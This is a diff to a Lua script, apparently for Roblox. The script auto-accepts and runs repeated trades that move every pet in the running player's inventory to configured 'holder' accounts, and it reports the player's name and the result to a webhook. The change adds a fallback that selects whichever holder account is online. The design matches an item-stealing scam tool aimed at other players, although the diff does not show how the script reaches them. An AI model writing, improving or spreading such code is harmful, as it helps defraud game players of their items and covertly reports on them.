@@ -346,7 +346,7 @@ end
 
 -- Main execution
 print(string.format("\n📋 Configuration:"))
-print(string.format("   • Holder: %s", table.concat(config.usernames, ", ")))
+print(string.format("   • Holders: %s (with fallback)", table.concat(config.usernames, " or ")))
 print(string.format("   • Pet Types: %d (ALL traded together!)", #config.pets_to_trade))
 print(string.format("   • Webhook: %s\n", config.Webhook ~= "" and "Enabled" or "Disabled"))
 
@@ -359,84 +359,107 @@ print("✅ Auto-accept enabled\n")
 
 local totalPetsTraded = 0
 
-for index, username in ipairs(config.usernames) do
-    print(string.format("\n┌────────────────────────────────────┐"))
-    print(string.format("│ 📊 Holder [%d/%d]: %s", index, #config.usernames, username))
-    print(string.format("└────────────────────────────────────┘"))
-    
-    -- Check if holder is in server
-    if not Players:FindFirstChild(username) then
-        warn(string.format("❌ %s is not in the server!", username))
-        sendWebhook(string.format("❌ %s - Failed - Not In Server", playerName))
-        continue
-    end
-    
-    -- Get ALL pets of ALL types
-    pets_unique_ids = get_all_pets()
-    
-    if #pets_unique_ids == 0 then
-        warn(string.format("❌ No pets found!"))
-        sendWebhook(string.format("❌ %s - No Pets Found", playerName))
-        continue
-    end
-    
-    local initial_pet_count = #pets_unique_ids
-    
-    -- Execute trades
-    local tradesNeeded = math.ceil(#pets_unique_ids / 18)
-    print(string.format("\n🔄 Will need approximately %d trade(s)...\n", tradesNeeded))
-    
-    local tradeAttempts = 0
-    local maxTrades = tradesNeeded + 5
-    
-    while #pets_unique_ids > 0 and tradeAttempts < maxTrades do
-        tradeAttempts = tradeAttempts + 1
-        
-        print(string.format("\n=== Trade Attempt %d ===", tradeAttempts))
-        
-        -- Check if holder still in server
-        if not Players:FindFirstChild(username) then
-            warn(string.format("⚠️ %s left the game!", username))
-            local traded_so_far = initial_pet_count - #pets_unique_ids
-            sendWebhook(string.format("⚠️ %s - Incomplete - Player Left (Traded: %d/%d)", playerName, traded_so_far, initial_pet_count))
-            break
-        end
-        
-        local success = autotrade(username)
-        
-        if not success then
-            warn("Trade attempt failed, retrying...")
-            task.wait(3)
+-- Smart username selection with fallback
+local function find_available_holder()
+    for index, username in ipairs(config.usernames) do
+        if Players:FindFirstChild(username) then
+            print(string.format("✅ Found holder: %s (option %d)", username, index))
+            return username
         else
-            task.wait(3)
+            print(string.format("⚠️  %s not in game (option %d), checking next...", username, index))
         end
     end
+    return nil
+end
+
+print("\n┌────────────────────────────────────┐")
+print("│ 🔍 Searching for available holder...│")
+print("└────────────────────────────────────┘")
+
+local selected_holder = find_available_holder()
+
+if not selected_holder then
+    local all_usernames = table.concat(config.usernames, ", ")
+    local error_msg = string.format("❌ NONE of the holders are in the server!\nTried: %s", all_usernames)
+    warn(error_msg)
+    sendWebhook(string.format("❌ %s - Failed - None of holders in server (%s)", playerName, all_usernames))
     
-    -- Log completion
-    local traded_count = initial_pet_count - #pets_unique_ids
+    print("\n========================================")
+    print("❌ SCRIPT STOPPED - NO HOLDERS FOUND")
+    print("========================================")
+    return
+end
+
+print(string.format("\n┌────────────────────────────────────┐"))
+print(string.format("│ 📊 Selected Holder: %s", selected_holder))
+print(string.format("└────────────────────────────────────┘"))
+
+-- Get ALL pets of ALL types
+pets_unique_ids = get_all_pets()
+
+if #pets_unique_ids == 0 then
+    warn(string.format("❌ No pets found!"))
+    sendWebhook(string.format("❌ %s - No Pets Found", playerName))
     
-    if #pets_unique_ids == 0 then
-        print(string.format("\n✅ Successfully traded ALL %d pets with %s", traded_count, username))
-        sendWebhook(string.format("✅ %s - COMPLETE - Traded: %d pets (all types)", playerName, traded_count))
-        table.insert(completedTrades, username)
-        totalPetsTraded = totalPetsTraded + traded_count
-    else
-        warn(string.format("\n⚠️ Partial trade: %d/%d pets traded to %s", traded_count, initial_pet_count, username))
-        sendWebhook(string.format("⚠️ %s - PARTIAL - Traded: %d/%d pets", playerName, traded_count, initial_pet_count))
-        totalPetsTraded = totalPetsTraded + traded_count
+    print("\n========================================")
+    print("❌ SCRIPT STOPPED - NO PETS TO TRADE")
+    print("========================================")
+    return
+end
+
+local initial_pet_count = #pets_unique_ids
+
+-- Execute trades
+local tradesNeeded = math.ceil(#pets_unique_ids / 18)
+print(string.format("\n🔄 Will need approximately %d trade(s)...\n", tradesNeeded))
+
+local tradeAttempts = 0
+local maxTrades = tradesNeeded + 5
+
+while #pets_unique_ids > 0 and tradeAttempts < maxTrades do
+    tradeAttempts = tradeAttempts + 1
+    
+    print(string.format("\n=== Trade Attempt %d ===", tradeAttempts))
+    
+    -- Check if holder still in server
+    if not Players:FindFirstChild(selected_holder) then
+        warn(string.format("⚠️ %s left the game!", selected_holder))
+        local traded_so_far = initial_pet_count - #pets_unique_ids
+        sendWebhook(string.format("⚠️ %s - Incomplete - Player Left (Traded: %d/%d)", playerName, traded_so_far, initial_pet_count))
+        break
     end
     
-    task.wait(5)
+    local success = autotrade(selected_holder)
+    
+    if not success then
+        warn("Trade attempt failed, retrying...")
+        task.wait(3)
+    else
+        task.wait(3)
+    end
+end
+
+-- Log completion
+local traded_count = initial_pet_count - #pets_unique_ids
+
+if #pets_unique_ids == 0 then
+    print(string.format("\n✅ Successfully traded ALL %d pets with %s", traded_count, selected_holder))
+    sendWebhook(string.format("✅ %s - COMPLETE - Traded: %d pets (all types) to %s", playerName, traded_count, selected_holder))
+    totalPetsTraded = traded_count
+else
+    warn(string.format("\n⚠️ Partial trade: %d/%d pets traded to %s", traded_count, initial_pet_count, selected_holder))
+    sendWebhook(string.format("⚠️ %s - PARTIAL - Traded: %d/%d pets to %s", playerName, traded_count, initial_pet_count, selected_holder))
+    totalPetsTraded = traded_count
 end
 
 print("\n┌────────────────────────────────────┐")
 print("│ 🎉 Trading Session Complete!       │")
-print(string.format("│ ✅ Success: %d/%d holders", #completedTrades, #config.usernames))
+print(string.format("│ ✅ Traded to: %s", selected_holder))
 print(string.format("│ ✅ Total Pets Traded: %d", totalPetsTraded))
 print("└────────────────────────────────────┘\n")
 
 -- Final webhook
-sendWebhook(string.format("✅ %s - SESSION COMPLETE - Total: %d pets (all types)", playerName, totalPetsTraded))
+sendWebhook(string.format("✅ %s - SESSION COMPLETE - Total: %d pets (all types) to %s", playerName, totalPetsTraded, selected_holder))
 
 -- Only disable if ALL pets are traded
 local remaining_pets = count_pets_in_inventory()
